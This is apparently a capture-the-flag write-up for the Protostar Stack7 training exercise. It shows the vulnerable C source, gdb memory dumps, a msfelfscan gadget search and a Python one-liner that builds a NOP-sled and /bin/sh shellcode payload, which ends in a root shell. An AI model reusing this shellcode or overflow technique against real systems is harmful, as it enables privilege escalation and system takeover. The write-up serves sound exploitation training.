#### Protostar Stack7

##### About
Stack6 introduces return to .text to gain code execution.  
  
The metasploit tool “msfelfscan” can make searching for suitable instructions very easy, otherwise looking through objdump output will suffice.  
  
This level is at /opt/protostar/bin/stack7

##### Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

This challenge can be solve with the same way which used in Stack6, return to .text, ROP, and so on.  
  
With the usage of strdup() in getpath(), I choose a simple and stable way which known as call/jmp register.  
  
Other ways to solve this challenge can be found in references.

##### Solution
```
$ gdb stack7
......
(gdb) disas getpath
Dump of assembler code for function getpath:
0x080484c4 <+0>:    push   %ebp
0x080484c5 <+1>:    mov    %esp,%ebp
0x080484c7 <+3>:    sub    $0x68,%esp
0x080484ca <+6>:    mov    $0x8048620,%eax
0x080484cf <+11>:   mov    %eax,(%esp)
0x080484d2 <+14>:   call   0x80483e4 <printf@plt>
0x080484d7 <+19>:   mov    0x8049780,%eax
0x080484dc <+24>:   mov    %eax,(%esp)
0x080484df <+27>:   call   0x80483d4 <fflush@plt>
0x080484e4 <+32>:   lea    -0x4c(%ebp),%eax
0x080484e7 <+35>:   mov    %eax,(%esp)
0x080484ea <+38>:   call   0x80483a4 <gets@plt>
0x080484ef <+43>:   mov    0x4(%ebp),%eax         ; <-- put the return address to the stack, so
0x080484f2 <+46>:   mov    %eax,-0xc(%ebp)        ; <-- the value of the return address will occur twice
......
0x08048538 <+116>:  lea    eax,[ebp-0x4c]         ; <-- put the buffer's address to EAX, try to call it
0x0804853b <+119>:  mov    DWORD PTR [esp],eax
0x0804853e <+122>:  call   0x80483f4 <strdup@plt>
0x08048543 <+127>:  leave  
0x08048544 <+128>:  ret      
End of assembler dump.
......
(gdb) b *0x080484ef
Breakpoint 1 at 0x080484ef: file stack7/stack7.c, line 15.
(gdb) r
Input path please: AAAAAAAAAAAAAAAA
Breakpoint 1, getpath() at stack7/stack7.c:15
(gdb) x/2x $ebp
0xbffffd18:     0xbffffd28      0x08048550
(gdb) x/28x $esp
0xbffffcb0:     0xbffffccc      0x00000000      0xb7fe1b28      0x00000001
0xbffffcc0:     0x00000000      0x00000001      0xb7fff8f8      0x41414141
0xbffffcd0:     0x41414141      0x41414141      0x41414141      0xb7eada00
0xbffffce0:     0xb7fd7ff4      0x0804973c      0xb7fffcf8      0x08048380
0xbffffcf0:     0xb7ff1040      0x0804973c      0xb7fffd28      0x08048589
0xbffffd00:     0xb7fd8304      0xb7fd7ff4      0x08048570      0xbffffd28
0xbffffd10:     0xb7ec6365      0xb7ff1040      0xb7fffd28      0x08048550
(gdb) quit

root@Kali:/tmp# msfelfscan -j EAX ./stack7          <-- I use sftp to get stack7 onto Kali, then use msfelfscan
[./stack7]
0x080484bf call eax
0x080485eb call eax

$ cat script.sh
#!/bin/sh
python -c "print '\90'*62+'\xeb\x14'+'\90'*16+'\xbf\x84\x04\x08'+'\x90'*20+'\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'" > /tmp/payload

$ ./script.sh
......
$ ./stack7 < /tmp/payload
......
# whoami
root
```

##### Reference
<https://github.com/Wins0n/Exploit-Exercises_ProtoStar/blob/master/protostar_part1.md>  
<https://thesprawl.org/research/exploit-exercises-protostar-stack/#stack-7>  
<https://www.mattandreko.com/2012/01/09/exploit-exercises-protostar-stack-7/>
